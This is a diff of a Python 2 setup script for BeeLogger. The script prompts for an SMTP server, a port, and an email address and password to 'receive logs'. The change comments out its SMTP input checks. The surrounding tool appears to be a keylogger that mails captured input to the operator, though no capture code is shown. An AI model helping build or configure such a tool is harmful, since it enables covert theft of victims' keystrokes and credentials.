@@ -16,13 +16,13 @@ def begin():
     os.system('sudo rm -Rf dist')
     print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
     gh = raw_input('\nType email server (ex: \'smtp.gmail.com\'): ')
-    if len(gh) != 1 or 'smtp' not in gh:
-        print "\n{0} [!] Please use a valid smtp server.{1}".format(RED, END)
-        begin()
+   # if len(gh) != 1 or 'smtp' not in gh:
+  #      print "\n{0} [!] Please use a valid smtp server.{1}".format(RED, END)
+   #     begin()
     ghp = raw_input('\nType email server port (ex: \'587\'): ')
-    if len(gh) != 1:
-        print "\n{0} [!] Please type a valid smtp server port.{1}".format(RED, END)
-        begin()
+   # if len(gh) != 1:
+ #       print "\n{0} [!] Please type a valid smtp server port.{1}".format(RED, END)
+      # begin()
     email = raw_input('Type your email to receive logs: ')
     epass = raw_input('Type your email password: ')
     print '\n'
